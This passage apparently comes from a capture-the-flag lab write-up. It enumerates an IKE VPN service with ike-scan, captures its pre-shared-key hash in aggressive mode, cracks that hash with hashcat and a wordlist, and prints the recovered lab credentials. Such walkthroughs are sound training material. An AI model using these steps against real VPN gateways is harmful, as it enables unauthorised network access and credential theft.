
##### Enumeration

```
ike-scan -M 10.129.238.52
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Main Mode Handshake returned
        HDR=(CKY-R=c0e94044d92f3401)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.029 seconds (34.38 hosts/sec).  1 returned handshake; 0 returned notify
```

From the response, we see a field called AUTH with a value of PSK. This means that the VPN is configured with a Pre-Shared key. Also, from the output, we see the encryption is set to 3DES, and the hash is SHA1.

Let's attempt an aggressive scan with -A and use the --pskcrack option to retrieve the pre-shared key so we can crack it offline

```
ike-scan -M -A --pskcrack=k.hash 10.129.238.52
```

This scan automatically downloads an "k.hash" file onto our local machine.
We can crack it now.

If john the ripper doesn't work, use hashcat.

```
hashcat k.hash /usr/share/wordlists/rockyou.txt                     
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 5003/10007 MB (2048 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5400 | IKE-PSK SHA1 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (8269 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f03e0fe818c47a8b5a503475f994cef517f36b8b30543b7e3d9211d5b8417749867ab0d1f1863a44e5fc70d9ff3f52506ae873e74dd8ce977c35cf0b30aaf46fe211590c4bbab461517469a5e6cd523148bcfa8d8824e8a5e84ab5eb4743548962001e410899ab2693cbb5e303b941458de9bc443bcb1fef0f3283698daba372:72a52a4fa3db197985eeb03c084ee6916f7d3ac1d435e456734d8929c81ff168b963824175b24a8aeb8f91a5c6612a35468d8b7bcf5670345524cbd7590b2442c8da71d3d37095b4f24d31a758a063cd6155c1f683dd79e18b10373b91f0adf66719c29722de852646bdbca207f9b21cdad2bf066d2daaa42fcfc3f853ffc406:5433c964f5b28dd3:c93d99ca2eaa4a34:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:747a32fd031e1815566242c241da5f494edcc59e:b4dfe47e2edd70a9dc09e9ac64847490ac759f1cf196b68700d42b0fbf10d920:7f3c59e72fdf5ca442c7eab4aae53b4f59bf9a2f:freakingrockstarontheroad
```

We now have user credentials.

```
ike:freakingrockstarontheroad
```
